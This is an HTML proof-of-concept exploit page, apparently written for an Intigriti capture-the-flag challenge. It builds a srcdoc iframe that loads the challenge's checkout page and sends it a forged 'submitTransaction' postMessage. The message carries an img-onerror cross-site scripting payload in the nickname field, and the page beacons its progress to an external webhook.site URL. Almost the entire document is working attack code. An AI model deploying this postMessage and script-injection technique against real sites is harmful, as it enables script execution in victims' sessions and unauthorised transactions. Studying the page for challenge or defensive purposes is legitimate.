<!DOCTYPE html>
<html><head><title>Srcdoc Exploit</title></head>
<body>
<h2>Exploit</h2>
<pre id=log></pre>
<iframe id="x" style="display:none"></iframe>
<script>
const WEBHOOK = 'https://webhook.site/f3aaf033-eed4-43c9-804b-9f0404dcded6';
const WALLET = '16472226db03703a192aa383237035a69f';
const log = document.getElementById('log');

function report(s) { log.textContent += '\n' + s; fetch(WEBHOOK + '?s=' + s).catch(()=>{}); }

report('1_START');

// Use srcdoc to create a same-origin iframe
const iframe = document.getElementById('x');
iframe.srcdoc = `
    <!DOCTYPE html>
    <body>
    <script>
        const parentOrigin = 'https://challenge-0126.intigriti.io';
        const iframe = document.createElement('iframe');
        iframe.src = parentOrigin + '/checkout.html?currency=1337COIN&price=1';
        document.body.appendChild(iframe);
        
        iframe.onload = function() {
            parent.postMessage('IFRAME_LOADED', '*');
            
            setTimeout(function() {
                iframe.contentWindow.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        toAddress: '${WALLET}',
                        currency: '1337COIN',
                        amount: 1,
                        nickname: '<img src=x onerror="alert(\\'gigawatz\\')">'
                    }
                }, parentOrigin);
                
                parent.postMessage('POSTMESSAGE_SENT', '*');
            }, 2000);
        };
    </script>
    </body>
</html>
`;

report('2_SRCDOC_SET');

window.addEventListener('message', function(e) {
    report('MSG_' + e.data);
});
</script>
</body>
</html>
